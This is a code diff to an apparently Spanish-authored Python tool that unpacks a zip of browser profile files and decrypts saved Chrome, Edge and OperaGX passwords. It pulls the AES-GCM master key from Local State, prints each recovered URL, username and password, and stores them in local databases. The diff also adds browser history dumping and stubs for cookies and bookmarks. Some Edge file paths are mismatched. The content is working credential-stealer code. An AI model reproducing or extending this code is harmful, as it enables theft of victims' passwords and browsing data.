@@ -24,6 +24,7 @@ PATH = {
     "EDGE_PASSWORDS_DB_PATH": BasePath + "Edge_Login_Data",
     "EDGE_COOKIES_DB_PATH": BasePath + "Edge_History",
     "EDGE_BOOKMARKS_FILE_PATH": BasePath + "Edge_Bookmarks",
+    "EDGE_HISTORY_DB_PATH": BasePath + "Edge_History",
     "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + "OPERAGX_Local_State",
     "OPERAGX_PASSWORDS_DB_PATH": BasePath + "OPERAGX_Login_Data",
     "OPERAGX_COOKIES_DB_PATH": BasePath + "OPERAGX_Cookies",
@@ -32,7 +33,7 @@ PATH = {
 }
 
 SQL = {
-    "LOGIN_DATA_SQL": "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins;",
+    "LOGIN_DATA_SQL": "SELECT action_url, username_value, password_value FROM logins",
     "COOKIES_SQL": "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, creation_utc, expires_utc, last_access_utc FROM cookies;",
     "HISTORY_SQL": "SELECT url, title, visit_count, last_visit_time FROM urls;",
     "DOWNLOADS_SQL": "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads;"
@@ -52,25 +53,19 @@ def run_server():
 def unpack():
     return shutil.unpack_archive("Data123963.zip", "Data/")
 
-"""
-*********************
-*Funciones Chrome y OperaGX
-*********************
-"""
-def ch_generate_cipher(aes_key,ini_vector):
-    return AES.new(aes_key,AES.MODE_GCM,ini_vector)
+def generate_cipher(master_key,ini_vector):
+    return AES.new(master_key,AES.MODE_GCM,ini_vector)
 
-def ch_decrypt_payload(cipher,payload):
+def decrypt_payload(cipher,payload):
     return cipher.decrypt(payload)
 
-def ch_decrypt_pass(buffer,aes_key):
+def decrypt_pass(buffer,master_key):
     try:
         ini_vector = buffer[3:15]
         payload = buffer[15:]
-        cipher = ch_generate_cipher(aes_key,ini_vector)
-        psswd = ch_decrypt_payload(cipher,payload)
+        cipher = generate_cipher(master_key,ini_vector)
+        psswd = decrypt_payload(cipher,payload)
         psswd = psswd[:-16].decode()
-
         return psswd
     except:
         try:
@@ -79,11 +74,15 @@ def ch_decrypt_pass(buffer,aes_key):
         except:
             pass
 
-def ch_master_Key(nav):
-    if nav =="chrome":
+def master_Key(nav):
+    global path
+
+    if nav =="Chrome":
         path = PATH["CHROME_LOCAL_STATE_FILE_PATH"]
-    else:
+    elif nav == "Opera":
         path = PATH["OPERAGX_LOCAL_STATE_FILE_PATH"]
+    elif nav == "Edge":
+        path = PATH["EDGE_HISTORY_DB_PATH"]
 
     with open(path, "r") as f:
         local_state = f.read()
@@ -94,42 +93,71 @@ def ch_master_Key(nav):
 
     return master_Key
 
-def ch_pass(nav):
-    if nav =="chrome":
+def get_pass(nav):
+
+    global cnn
+    global cnn1
+
+    if nav =="Chrome":
         cnn = sqlite3.connect(PATH["CHROME_PASSWORDS_DB_PATH"])
         cnn1 = sqlite3.connect("chrome_pass.db")
-    else:
+    elif nav =="Opera":
         cnn = sqlite3.connect(PATH["OPERAGX_PASSWORDS_DB_PATH"])
         cnn1 = sqlite3.connect("operagx_pass.db")
+    elif nav == "Edge":
+        cnn = sqlite3.connect(PATH["EDGE_PASSWORDS_DB_PATH"])
+        cnn1 = sqlite3.connect("edge_pass.db")
 
     cursor = cnn.cursor()
     cursor1 = cnn1.cursor()
 
-    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+    cursor.execute(SQL["LOGIN_DATA_SQL"])
     cursor1.execute('''CREATE TABLE passwords(url, username, password)''')
     try:
         for i in cursor.fetchall():
-            decrypted_password = ch_decrypt_pass(i[2], ch_master_Key(nav))
+            decrypted_password = decrypt_pass(i[2], master_Key(nav))
             if decrypted_password:
+                print(i[0],i[1],decrypted_password)
                 cursor1.execute("INSERT INTO passwords (url, username, password) VALUES (?, ?, ?)", (i[0], i[1], decrypted_password))
                 cnn1.commit()
-    except:
-        pass
     finally:
         cursor.close()
         cnn.close()
 
-"""
-***************************
-*Funciones Chrome y OperaGX
-***************************
-"""
+def get_historial(nav):
 
+    global cnn
+
+    if nav =="Chrome":
+        cnn = sqlite3.connect(PATH["CHROME_HISTORY_DB_PATH"])
+    elif nav =="Opera":
+        cnn = sqlite3.connect(PATH["OPERAGX_HISTORY_DB_PATH"])
+    elif nav == "Edge":
+        cnn = sqlite3.connect(PATH["EDGE_COOKIES_DB_PATH"])
+
+    cursor = cnn.cursor()
+
+    cursor.execute(SQL["HISTORY_SQL"])
+
+    try:
+        for i in cursor.fetchall():
+            print(i)
+    except:
+        pass
+
+def get_cookies(nav):
+    pass
+
+def get_bookmarks(nav):
+    pass
 
 def main():
     options = { 1: run_server,
                 2: unpack,
-                3: ch_pass,
+                3: get_pass,
+                4: get_historial,
+                5: get_cookies,
+                6: get_bookmarks,
         }
 
     while True:
@@ -153,14 +181,14 @@ def main():
                 y = int(input())
                 if y == 1:
                     #Chrome
-                    options[3]("chrome")
-                elif x == 2:
+                    options[x]("Chrome")
+                elif y == 2:
                     pass
                     #Edge
-                    #options[x]("esge")
+                    options[x]("Edge")
                 elif y == 3:
                     #OperaGX
-                    options[3]("Opera")
+                    options[x]("Opera")
             if x == 4:
                 print("1. Check Chrome Historial")
                 print("2. Check Edge Historial")
@@ -168,8 +196,8 @@ def main():
                 y = int(input())
                 if y == 1:
                     # Chrome
-                    options[x]("chrome")
-                elif x == 2:
+                    options[x]("Chrome")
+                elif y == 2:
                     #Edge
                     options[x]("Edge")
                 elif y == 3:
@@ -183,7 +211,7 @@ def main():
                 if y == 1:
                     # Chrome
                     options[x]("chrome")
-                elif x == 2:
+                elif y == 2:
                     #Edge
                     options[x]("Edge")
                 elif y == 3:
@@ -198,7 +226,7 @@ def main():
                 if y == 1:
                     # Chrome
                     options[x]("chrome")
-                elif x == 2:
+                elif y == 2:
                     #Edge
                     options[x]("Edge")
                 elif y == 3:
@@ -209,20 +237,6 @@ def main():
                 break
         else:
             pass
-
-
-
-    """
-    get_master_key(PATH["CHROME_LOCAL_STATE_FILE_PATH"], master_key_path)
-     for file_path in TARGET_FILE_PATH:
-    """
-
-    """"
-    x = get_db_data("CHROME_HISTORY_DB_PATH","HISTORY_SQL")
-    for i in x:
-        print(i)
-    """
-
 
 if __name__ == "__main__":
     main()
